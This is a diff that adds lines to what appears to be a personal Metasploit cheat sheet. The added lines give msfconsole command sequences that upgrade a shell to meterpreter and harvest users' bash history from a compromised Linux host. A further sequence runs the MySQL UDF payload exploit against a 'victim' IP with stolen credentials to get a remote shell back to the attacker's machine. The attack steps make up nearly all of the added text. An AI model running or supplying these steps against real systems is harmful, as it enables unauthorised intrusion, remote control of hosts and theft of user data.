@@ -48,3 +48,22 @@
   > upload / downlaod       // '\' Characters must be escaped -> eg 'C:\\Windows'
 
   > shell                   // interactive shell
+  
+  > post/multi/manage/shell_to_meterpreter
+  
+  > search for history bash files in msfconsole:
+   > gather session to victim
+   > use post/linux/gather/enum_users_history
+    > set session <session ID>
+  > run
+  
+  > mysql remote shell via msfconsole:
+  > gather user and pass for login
+  > use exploit/multi/mysql/mysql_udf_payload
+  > set FORCE_UDF_UPLOAD true
+  > set PASSWORD <Password>
+  > set RHOSTS <victim ip>
+  > set TARGET 1
+  > set LHOST <local ip>
+  > exploit
+  > session -i 2
